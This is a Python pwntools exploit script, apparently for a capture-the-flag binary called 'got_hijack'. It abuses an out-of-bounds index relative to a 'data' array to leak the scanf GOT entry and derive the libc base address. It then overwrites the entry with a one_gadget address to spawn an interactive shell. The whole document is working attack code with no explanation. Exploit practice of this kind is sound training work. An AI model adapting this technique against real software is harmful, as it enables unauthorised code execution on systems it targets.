#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

elf = ELF('./got_hijack')
p = process('./got_hijack')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p, '''''')
offset = (elf.got['puts'] - elf.symbols['data']) // 8
print(offset)

offset = (elf.got['__isoc99_scanf'] - elf.symbols['data']) // 8
print(offset)

p.sendlineafter(':', str(offset))
p.recvuntil('=')

printf_addr = int(p.recvline().strip())
print(hex(printf_addr))
libc_base = printf_addr - libc.symbols['__isoc99_scanf']

one_gadget = libc_base + 0xe6c81
p.sendlineafter(':', str(one_gadget))
p.interactive()





